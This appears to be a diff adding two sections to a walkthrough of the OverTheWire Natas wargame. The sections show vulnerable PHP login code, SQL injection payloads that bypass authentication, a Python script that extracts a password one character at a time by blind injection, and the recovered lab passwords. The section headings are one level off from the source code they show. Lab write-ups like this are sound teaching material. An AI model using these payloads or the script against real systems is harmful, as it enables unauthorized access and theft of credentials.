@@ -486,3 +486,149 @@ Now we can upload the file and do the same interception and edit trick as before
 
 Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
+## Natas 15
+
+> The page shows this form:
+> ![form](pics/natas/2025-07-05-11-15-51.png)
+> The source code is:
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<?php } ?>
+```
+
+The code connects to the MySQL database and checks if the provided username and password match any user in the `users` table.
+If the query returns any rows, it means the login is successful and the password for natas15 is printed.  
+The query is constructed using the provided username and password without any sanitization, which makes it vulnerable to SQL injection attacks.  
+To exploit this vulnerability, we can use a SQL injection attack to bypass the authentication mechanism and retrieve the password for natas15.
+
+To do this, we can use the following payload for the username and password fields:
+
+```
+Username: " OR "1"="1
+Password: " OR "1"="1
+```
+
+This payload will make the query always return true.
+
+![password](pics/natas/2025-07-05-11-29-52.png)
+
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+## Natas 16
+
+> The page shows this form:
+> ![form](pics/natas/2025-07-05-11-30-37.png)
+> The source code is:
+
+```php
+<?php
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<?php } ?>
+```
+
+The code connects to the MySQL database and checks if the provided username exists in the `users` table.
+If the query returns any rows, it means the user exists and a message is printed.  
+$_GET is used to check if the `debug` parameter is set, in which case it prints the executed query. To use it we can add `?debug=1` to the URL.
+
+![debug mode](pics/natas/2025-07-05-11-37-09.png)
+
+The query is constructed using the provided username without any sanitization, which makes it vulnerable to SQL injection attacks.  
+Since we only get "This user exists." or "This user doesn't exist." messages, to find the password we can make the query check if the password starts with a specific character and extract the password character by character.
+To do this, we can use the following payload for the username field:
+
+```
+Username: natas16" AND SUBSTRING(password,1,1) = "a" --
+```
+
+This payload will make the query check if the password starts with the letter "a". If it does, we will get the message "This user exists.", otherwise we will get "This user doesn't exist.".  
+Now we have to automate the process of checking each character of the password. We can use a script to do this:
+
+```python
+import requests
+import string
+
+URL = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
+auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+known = ""
+found = True
+charSet = string.digits + string.ascii_letters
+
+for i in range(1, 65):
+    if not found:
+        break
+    for c in charSet:
+        payload = f'natas16" AND BINARY SUBSTRING(password,{i},1) = "{c}" -- '
+        payload = {"username": payload}
+        r = requests.post(url = URL, auth=auth, data = payload)
+        if "This user exists" in r.text:
+            found = True
+            known += c
+            print(known)
+            break
+        else:
+            found = False
+```
+
+This script will try each character in the character set for each position in the password until it finds the correct character. `BINARY` is used to make the comparison case-sensitive, which is important since the password is case-sensitive.
+
+![Password](pics/natas/2025-07-05-12-27-12.png)
+
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
